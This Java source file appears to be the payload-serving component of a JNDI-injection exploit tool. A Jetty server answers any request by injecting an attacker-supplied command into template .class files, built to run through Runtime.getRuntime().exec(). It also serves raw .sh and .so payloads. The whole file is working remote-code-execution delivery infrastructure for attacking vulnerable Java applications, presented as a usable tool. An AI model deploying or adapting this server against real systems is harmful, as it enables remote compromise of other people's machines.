package jetty;

import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.servlet.ServletHandler;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.net.URLEncoder;

import static run.ServerStart.getLocalTime;
import static util.Transformers.insertCommand;

/**
 * @Classname JettyServer
 * @Description HTTPServer supply .class file which execute command by Runtime.getRuntime.exec()
 * @Author welkin
 */
public class JettyServer implements Runnable{
    private int port;
    private Server server;
    private static String command;

//    public JettyServer(int port) {
//        this.port = port;
//        server = new Server(port);
//        command = "open /Applications/Calculator.app";
//    }

    public JettyServer(int port,String cmd) {
        this.port = port;
        server = new Server(port);
        command = cmd;
    }

    @Override
    public void run() {
        ServletHandler handler = new ServletHandler();
        server.setHandler(handler);

        handler.addServletWithMapping(DownloadServlet.class, "/*");
        try {
            server.start();
            server.join();
        }catch (Exception e){
            e.printStackTrace();
        }

    }

    @SuppressWarnings("serial")
    public static class DownloadServlet extends HttpServlet {
        public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{

            String filename = request.getRequestURI().substring(1);
            InputStream in = checkFilename(filename);
            if(filename.endsWith(".sh")||filename.endsWith(".so")) {
                int len ;
                byte[] buffer = new byte[1024];
                OutputStream out = response.getOutputStream();
                if (in != null){
                    while ((len = in.read(buffer)) > 0) {
                        out.write(buffer,0,len);
                    }
                    in.close();
                }else {
                    System.out.println(getLocalTime() + " [JETTYSERVER]>> Read file error!");
                }
                response.setStatus(HttpServletResponse.SC_OK);
                response.setHeader("content-disposition", "attachment;filename="+URLEncoder.encode(filename, "UTF-8"));
                return;
            }
            byte[] transformed;
            InputStream bain = null;
            if (in != null) {
                if(!filename.contains("ADR")) {
                    try {
                        transformed = insertCommand(in, command);
                        bain = new ByteArrayInputStream(transformed);

                    } catch (Exception e) {
                        e.printStackTrace();
                        System.out.println(getLocalTime() + " [JETTYSERVER]>> Byte array build failed.");
                    }
                } else {
                    bain = in;
                }


                System.out.println(getLocalTime() + " [JETTYSERVER]>> Log a request to " + request.getRequestURL());
                response.setStatus(HttpServletResponse.SC_OK);
                response.setHeader("content-disposition", "attachment;filename="+URLEncoder.encode(filename, "UTF-8"));

                int len ;
                byte[] buffer = new byte[1024];
                OutputStream out = response.getOutputStream();
                if (bain != null){
                    while ((len = bain.read(buffer)) > 0) {
                        out.write(buffer,0,len);
                    }
                    bain.close();
                }else {
                    System.out.println(getLocalTime() + " [JETTYSERVER]>> Read file error!");
                }
            }else {
                System.out.println(getLocalTime() + " [JETTYSERVER]>> URL("+ request.getRequestURL() +") Not Exist!");
            }
        }

        public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{
            doGet(request, response);
        }
    }

    private static InputStream checkFilename(String filename){
        String template;
        switch (filename){
            case "ExecTemplateJDK7.class":
                template = "template/ExecTemplateJDK7.class";
                break;
            case "template/ExecTemplateJDK8.class":
                template = "template/ExecTemplateJDK8.class";
                break;
                // TODO:Add more
            default:
                System.out.println("filename");
                template = "template/"+filename;
        }
        return Thread.currentThread().getContextClassLoader().getResourceAsStream(template);

    }

}
